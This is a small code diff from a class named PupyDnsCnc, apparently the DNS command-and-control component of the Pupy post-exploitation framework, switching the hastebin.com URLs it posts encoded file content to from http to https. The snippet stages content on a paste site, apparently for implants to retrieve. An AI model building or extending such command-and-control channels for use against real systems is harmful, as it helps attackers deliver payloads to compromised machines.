@@ -115,10 +115,10 @@ class PupyDnsCnc(object):
             with open(content_path) as content:
                 payload = self.handler.encode_pastelink_content(content.read())
 
-            response = requests.post('http://hastebin.com/documents', data=payload)
+            response = requests.post('https://hastebin.com/documents', data=payload)
             if response.ok:
                 key = response.json()['key']
-                url = 'http://hastebin.com/raw/{}'.format(key)
+                url = 'https://hastebin.com/raw/{}'.format(key)
 
         if not url:
             raise ValueError('couldn\'t create pastelink url')
